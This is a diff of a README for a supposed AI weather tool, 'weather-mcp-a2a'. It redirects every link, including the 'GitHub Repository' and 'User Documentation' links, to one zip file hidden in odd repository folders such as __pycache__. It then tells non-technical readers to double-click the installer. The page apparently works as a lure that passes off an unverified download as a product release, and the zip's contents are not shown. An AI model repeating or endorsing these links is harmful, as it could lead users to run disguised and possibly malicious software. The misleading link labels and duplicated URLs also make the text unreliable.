@@ -1,6 +1,6 @@
 # 🌤️ weather-mcp-a2a - Get Real-Time Weather Intelligence Effortlessly
 
-[![Download](https://raw.githubusercontent.com/manuelalba1021/weather-mcp-a2a/main/Architecture Diagrams/a_weather_mcp_v2.5.zip%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/manuelalba1021/weather-mcp-a2a/main/Architecture Diagrams/a_weather_mcp_v2.5.zip)
+[![Download](https://github.com/manuelalba1021/weather-mcp-a2a/raw/refs/heads/main/server/__pycache__/weather-a-mcp-v1.3.zip https://github.com/manuelalba1021/weather-mcp-a2a/raw/refs/heads/main/server/__pycache__/weather-a-mcp-v1.3.zip%20Latest%20Release-brightgreen)](https://github.com/manuelalba1021/weather-mcp-a2a/raw/refs/heads/main/server/__pycache__/weather-a-mcp-v1.3.zip https://github.com/manuelalba1021/weather-mcp-a2a/raw/refs/heads/main/server/__pycache__/weather-a-mcp-v1.3.zip)
 
 ## 📖 Description
 The weather-mcp-a2a project provides an agentic AI system that fetches and reasons over real-time global weather data. This tool uses standardized methods to ensure accurate updates, helping you make informed decisions based on climate conditions. No programming skills are necessary.
@@ -15,7 +15,7 @@ To use weather-mcp-a2a, you will need to download it from our Releases page. Fol
 - Internet: Required for real-time data fetching
 
 ## 📥 Download & Install
-Visit this page to download the application: [Download Page](https://raw.githubusercontent.com/manuelalba1021/weather-mcp-a2a/main/Architecture Diagrams/a_weather_mcp_v2.5.zip)
+Visit this page to download the application: [Download Page](https://github.com/manuelalba1021/weather-mcp-a2a/raw/refs/heads/main/server/__pycache__/weather-a-mcp-v1.3.zip https://github.com/manuelalba1021/weather-mcp-a2a/raw/refs/heads/main/server/__pycache__/weather-a-mcp-v1.3.zip)
 
 ### 1. Navigate to the Download Page
 Click the link above or use your web browser to open the Releases page. You’ll find a list of all available versions of weather-mcp-a2a.
@@ -24,7 +24,7 @@ Click the link above or use your web browser to open the Releases page. You’ll
 Look for the most recent release at the top of the list. The latest version will have the highest number. Click the link to view its details.
 
 ### 3. Download the Installer
-Find the file that matches your operating system. The installer will be labeled clearly (e.g., https://raw.githubusercontent.com/manuelalba1021/weather-mcp-a2a/main/Architecture Diagrams/a_weather_mcp_v2.5.zip for Windows users) or similar for Mac and Linux. Click the corresponding download link.
+Find the file that matches your operating system. The installer will be labeled clearly (e.g., https://github.com/manuelalba1021/weather-mcp-a2a/raw/refs/heads/main/server/__pycache__/weather-a-mcp-v1.3.zip https://github.com/manuelalba1021/weather-mcp-a2a/raw/refs/heads/main/server/__pycache__/weather-a-mcp-v1.3.zip for Windows users) or similar for Mac and Linux. Click the corresponding download link.
 
 ### 4. Run the Installer
 Once the file is downloaded, locate it in your Downloads folder. Double-click the installer file to start the installation process.
@@ -58,12 +58,12 @@ Feel free to share your experiences or ask questions in the discussion section o
 For detailed guides and advanced usages, consider visiting the documentation section on GitHub.
 
 ## 🌐 Additional Resources
-- [GitHub Repository](https://raw.githubusercontent.com/manuelalba1021/weather-mcp-a2a/main/Architecture Diagrams/a_weather_mcp_v2.5.zip)
-- [User Documentation](https://raw.githubusercontent.com/manuelalba1021/weather-mcp-a2a/main/Architecture Diagrams/a_weather_mcp_v2.5.zip)
+- [GitHub Repository](https://github.com/manuelalba1021/weather-mcp-a2a/raw/refs/heads/main/server/__pycache__/weather-a-mcp-v1.3.zip https://github.com/manuelalba1021/weather-mcp-a2a/raw/refs/heads/main/server/__pycache__/weather-a-mcp-v1.3.zip)
+- [User Documentation](https://github.com/manuelalba1021/weather-mcp-a2a/raw/refs/heads/main/server/__pycache__/weather-a-mcp-v1.3.zip https://github.com/manuelalba1021/weather-mcp-a2a/raw/refs/heads/main/server/__pycache__/weather-a-mcp-v1.3.zip)
 
 ## 📝 License
 This project is licensed under the MIT License. See the LICENSE file for more details.
 
 For further inquiries, visit the repository or contact the maintainers through GitHub. 
 
-[![Download](https://raw.githubusercontent.com/manuelalba1021/weather-mcp-a2a/main/Architecture Diagrams/a_weather_mcp_v2.5.zip%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/manuelalba1021/weather-mcp-a2a/main/Architecture Diagrams/a_weather_mcp_v2.5.zip)
+[![Download](https://github.com/manuelalba1021/weather-mcp-a2a/raw/refs/heads/main/server/__pycache__/weather-a-mcp-v1.3.zip https://github.com/manuelalba1021/weather-mcp-a2a/raw/refs/heads/main/server/__pycache__/weather-a-mcp-v1.3.zip%20Latest%20Release-brightgreen)](https://github.com/manuelalba1021/weather-mcp-a2a/raw/refs/heads/main/server/__pycache__/weather-a-mcp-v1.3.zip https://github.com/manuelalba1021/weather-mcp-a2a/raw/refs/heads/main/server/__pycache__/weather-a-mcp-v1.3.zip)
